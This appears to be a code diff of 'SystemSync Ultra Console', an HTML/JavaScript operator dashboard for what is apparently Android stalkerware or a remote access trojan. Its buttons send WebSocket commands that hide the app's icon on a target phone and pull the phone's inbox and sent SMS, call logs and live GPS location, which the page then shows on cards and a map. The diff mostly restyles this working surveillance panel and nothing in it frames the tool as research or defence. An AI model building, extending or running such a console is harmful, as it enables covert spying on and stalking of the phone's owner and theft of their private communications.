@@ -6,149 +6,153 @@
 
 <title>SystemSync Ultra Console</title>
 
-<link rel="stylesheet"
- href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 
 <style>
 
-*{
-    box-sizing:border-box;
-}
+/* ===== GLOBAL ===== */
 
 body{
     margin:0;
-    background:radial-gradient(circle at top,#0a0a0a,#000);
-    color:#e6e6e6;
-    font-family:'Segoe UI',system-ui;
-    height:100vh;
+    background:linear-gradient(135deg,#050505,#0c0c0c);
+    color:#e0e0e0;
+    font-family:'Segoe UI',sans-serif;
     display:flex;
     flex-direction:column;
+    height:100vh;
+    overflow:hidden;
 }
 
-/* HEADER */
+/* ===== HEADER ===== */
 
 .header{
-    height:65px;
-    background:rgba(20,20,20,.9);
-    backdrop-filter:blur(10px);
+    height:60px;
+    background:#000;
     border-bottom:1px solid #111;
     display:flex;
-    justify-content:space-between;
     align-items:center;
+    justify-content:space-between;
     padding:0 25px;
+}
+
+.title{
+    font-size:20px;
+    color:#00d2ff;
+    font-weight:600;
 }
 
 .status-badge{
     padding:6px 14px;
     border-radius:20px;
-    font-weight:600;
+    font-weight:bold;
 }
 
-.online{
-    background:#062d12;
-    color:#5cff91;
-}
-
-.offline{
-    background:#3a0606;
-    color:#ff7b7b;
-}
+.online{background:#063b13;color:#69f0ae;}
+.offline{background:#3b0606;color:#ff8a80;}
 
 .net-info{
     font-family:monospace;
-    color:#00d2ff;
+    color:#64b5f6;
 }
 
-/* LAYOUT */
+/* ===== MAIN LAYOUT ===== */
 
 .main{
     flex:1;
     display:flex;
 }
 
-/* CONTROL PANEL */
+/* ===== CONTROL PANEL ===== */
 
 .panel{
     width:320px;
-    background:linear-gradient(180deg,#111,#050505);
+    background:#0d0d0d;
     border-right:1px solid #111;
     padding:25px;
+    overflow-y:auto;
 }
 
-.panel-title{
-    font-size:20px;
-    color:#00d2ff;
-    margin-bottom:25px;
+.section{
+    margin-bottom:28px;
 }
 
-/* BUTTONS */
+.section h3{
+    margin:0 0 10px 0;
+    font-size:14px;
+    color:#90caf9;
+    letter-spacing:1px;
+}
 
 button{
     width:100%;
     padding:12px;
-    margin-bottom:10px;
+    margin-bottom:8px;
     border:none;
-    border-radius:10px;
+    border-radius:8px;
     cursor:pointer;
-    font-weight:600;
-    letter-spacing:.5px;
     background:#151515;
-    color:#fff;
+    color:white;
     transition:.25s;
+    font-size:14px;
 }
 
 button:hover{
-    transform:translateY(-2px);
     background:#1f1f1f;
+    transform:translateY(-1px);
 }
 
-/* TOGGLE */
+/* TOGGLE BUTTON */
 
-.toggle-on{
-    background:linear-gradient(90deg,#00d2ff,#3a7cff);
+.toggle{
+    background:linear-gradient(135deg,#00d2ff,#3a7bd5);
+    color:black;
+    font-weight:600;
 }
 
-.toggle-off{
-    background:linear-gradient(90deg,#ff3b3b,#ff6b6b);
-}
-
-/* MOBILE FRAME */
+/* ===== MOBILE FRAME ===== */
 
 .viewer{
     flex:1;
     display:flex;
-    justify-content:center;
     align-items:center;
+    justify-content:center;
 }
 
 .phone{
     width:380px;
-    height:700px;
-    border-radius:40px;
-    padding:12px;
-    background:
-        linear-gradient(145deg,#1a1a1a,#000);
-    box-shadow:
-        0 0 60px rgba(0,210,255,.12),
-        inset 0 0 25px rgba(255,255,255,.02);
-}
-
-.screen{
-    width:100%;
-    height:100%;
-    border-radius:28px;
+    height:720px;
+    border-radius:38px;
     background:#000;
+    box-shadow:
+        0 0 60px rgba(0,210,255,.08),
+        inset 0 0 15px rgba(255,255,255,.05);
+    border:10px solid #111;
+    display:flex;
+    flex-direction:column;
     overflow:hidden;
-    position:relative;
 }
 
-/* DATA */
+.phone-header{
+    padding:14px;
+    background:#070707;
+    border-bottom:1px solid #111;
+    text-align:center;
+    font-weight:600;
+}
+
+.phone-content{
+    flex:1;
+    overflow:auto;
+    padding:12px;
+}
+
+/* DATA CARDS */
 
 .data-card{
-    background:#141414;
-    margin:10px;
+    background:#111;
     padding:10px;
-    border-radius:10px;
+    margin-bottom:10px;
+    border-radius:6px;
     border-left:3px solid #00d2ff;
 }
 
@@ -157,16 +161,20 @@ button:hover{
     font-size:12px;
 }
 
+/* MAP */
+
 #map{
     height:100%;
+    width:100%;
 }
 
 .gps-info{
     position:absolute;
     top:0;
+    left:0;
     width:100%;
-    background:rgba(0,0,0,.8);
-    padding:8px;
+    padding:10px;
+    background:rgba(0,0,0,.75);
     font-size:12px;
 }
 
@@ -176,67 +184,79 @@ button:hover{
 <body>
 
 <div class="header">
-    <div id="connectionStatus" class="status-badge offline">
-        DEVICE: OFFLINE
+    <div class="title">SystemSync Command Center</div>
+
+    <div class="status-badge offline" id="connectionStatus">
+        DEVICE OFFLINE
     </div>
 
-    <div id="networkInfo" class="net-info">
-        WAITING FOR NETWORK DATA...
+    <div class="net-info" id="networkInfo">
+        WAITING FOR NETWORK…
     </div>
 </div>
 
 <div class="main">
 
-<!-- CONTROL PANEL -->
-<div class="panel">
+    <!-- LEFT PANEL -->
+    <div class="panel">
 
-<div class="panel-title">
-⚡ SystemSync Control
-</div>
+        <div class="section">
+            <h3>APP CONTROL</h3>
 
-<button id="toggleAppBtn"
-        class="toggle-on"
-        onclick="toggleApp()">
-Hide App
-</button>
+            <!-- 🔥 TOGGLE BUTTON -->
+            <button id="toggleAppBtn"
+                    class="toggle"
+                    onclick="toggleApp()">
+                Hide App Icon
+            </button>
+        </div>
 
-<button onclick="sendCommand('getSMS inbox')">
-Inbox SMS
-</button>
+        <div class="section">
+            <h3>COMMUNICATION</h3>
 
-<button onclick="sendCommand('getSMS sent')">
-Sent SMS
-</button>
+            <button onclick="sendCommand('getSMS inbox')">
+                Inbox SMS
+            </button>
 
-<button onclick="sendCommand('getCallLogs')">
-Call Logs
-</button>
+            <button onclick="sendCommand('getSMS sent')">
+                Sent SMS
+            </button>
 
-<button onclick="sendCommand('getLocation')">
-GPS Location
-</button>
+            <button onclick="sendCommand('getCallLogs')">
+                Call Logs
+            </button>
+        </div>
 
-</div>
+        <div class="section">
+            <h3>TRACKING</h3>
 
-<!-- MOBILE FRAME -->
-<div class="viewer">
+            <button onclick="sendCommand('getLocation')">
+                Live GPS Location
+            </button>
+        </div>
 
-<div class="phone">
-<div class="screen">
+    </div>
 
-<div id="outputContent"
-     style="color:#444;
-     display:flex;
-     justify-content:center;
-     align-items:center;
-     height:100%;">
-Select an option to view data
-</div>
+    <!-- RIGHT MOBILE VIEW -->
+    <div class="viewer">
 
-</div>
-</div>
+        <div class="phone">
 
-</div>
+            <div class="phone-header"
+                 id="outputHeader">
+                Output View
+            </div>
+
+            <div class="phone-content"
+                 id="outputContent">
+
+                <div style="text-align:center;color:#555;margin-top:50%;">
+                    Awaiting command…
+                </div>
+
+            </div>
+        </div>
+    </div>
 </div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -244,31 +264,33 @@ Select an option to view data
 <script>
 
 const ws = new WebSocket("wss://" + window.location.host);
+
 let mapInstance=null;
 let appHidden=false;
 
-/* TOGGLE BUTTON */
+/* =========================
+   TOGGLE BUTTON
+========================= */
 
 function toggleApp(){
 
-    if(appHidden){
-        sendCommand('showApp');
-        toggleAppBtn.innerText="Hide App";
-        toggleAppBtn.className="toggle-on";
-    }else{
-        sendCommand('hideApp');
-        toggleAppBtn.innerText="Show App";
-        toggleAppBtn.className="toggle-off";
-    }
-
     appHidden=!appHidden;
+
+    if(appHidden){
+        sendCommand('hideApp');
+        toggleAppBtn.innerText="Show App Icon";
+    }
+    else{
+        sendCommand('showApp');
+        toggleAppBtn.innerText="Hide App Icon";
+    }
 }
 
-/* SOCKET */
+/* =========================
+   SOCKET
+========================= */
 
-ws.onopen=()=>{
-    ws.send("I_AM_WEB");
-};
+ws.onopen=()=>ws.send("I_AM_WEB");
 
 ws.onmessage=(event)=>{
 
@@ -278,12 +300,11 @@ ws.onmessage=(event)=>{
         const status=msg.split(":")[1];
         const badge=document.getElementById('connectionStatus');
 
-        badge.className=
-            status==='ONLINE'
+        badge.className=status==='ONLINE'
             ?'status-badge online'
             :'status-badge offline';
 
-        badge.innerText="DEVICE: "+status;
+        badge.innerText="DEVICE "+status;
     }
 
     else if(msg.startsWith("NET_INFO:")){
@@ -303,18 +324,19 @@ ws.onmessage=(event)=>{
     }
 };
 
-/* COMMAND */
-
 function sendCommand(cmd){
     ws.send(cmd);
     outputContent.innerHTML=
-        '<div style="padding:20px;">Fetching...</div>';
+        '<div style="text-align:center;padding:20px;">Fetching Data...</div>';
 }
 
-/* SMS */
+/* =========================
+   RENDERERS
+========================= */
 
 function renderSMS(data){
 
+    outputHeader.innerText="SMS Messages";
     outputContent.innerHTML="";
 
     data.forEach(sms=>{
@@ -323,19 +345,19 @@ function renderSMS(data){
         card.className="data-card";
 
         card.innerHTML=`
-        <div><span class="label">FROM:</span> ${sms.number}</div>
-        <div>${sms.content}</div>
-        <div class="label">${sms.date}</div>
+            <div><span class="label">TYPE:</span> <b>${sms.type}</b></div>
+            <div><span class="label">FROM:</span> ${sms.number}</div>
+            <div><span class="label">MSG:</span> ${sms.content}</div>
+            <div><span class="label">TIME:</span> ${sms.date}</div>
         `;
 
         outputContent.appendChild(card);
     });
 }
 
-/* CALLS */
-
 function renderCalls(data){
 
+    outputHeader.innerText="Call Logs";
     outputContent.innerHTML="";
 
     data.forEach(call=>{
@@ -344,32 +366,33 @@ function renderCalls(data){
         card.className="data-card";
 
         card.innerHTML=`
-        <div><span class="label">NUMBER:</span> ${call.number}</div>
-        <div><span class="label">DURATION:</span> ${call.duration}</div>
-        <div class="label">${call.date}</div>
+            <div><span class="label">TYPE:</span> <b>${call.type}</b></div>
+            <div><span class="label">CONTACT:</span> ${call.number}</div>
+            <div><span class="label">DURATION:</span> ${call.duration}</div>
+            <div><span class="label">TIME:</span> ${call.date}</div>
         `;
 
         outputContent.appendChild(card);
     });
 }
 
-/* GPS */
-
 function renderLocation(data){
 
+    outputHeader.innerText="GPS Tracking";
     outputContent.innerHTML="";
 
     if(data.error){
-        outputContent.innerHTML=data.error;
+        outputContent.innerHTML=`<div style="color:red;text-align:center;">${data.error}</div>`;
         return;
     }
 
     const info=document.createElement('div');
     info.className='gps-info';
+
     info.innerHTML=`
-    LAT: ${data.lat} |
-    LON: ${data.lon} |
-    ACC: ${data.acc}m
+        <div><b>LAT:</b> ${data.lat}</div>
+        <div><b>LON:</b> ${data.lon}</div>
+        <div><b>ACCURACY:</b> ${data.acc} meters</div>
     `;
 
     outputContent.appendChild(info);
@@ -389,15 +412,19 @@ function renderLocation(data){
             'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
         ).addTo(mapInstance);
 
-        L.marker([data.lat,data.lon]).addTo(mapInstance);
+        L.marker([data.lat,data.lon])
+            .addTo(mapInstance);
 
         L.circle([data.lat,data.lon],{
-            radius:data.acc
+            radius:data.acc,
+            color:'blue',
+            fillOpacity:.2
         }).addTo(mapInstance);
 
     },100);
 }
 
 </script>
+
 </body>
 </html>
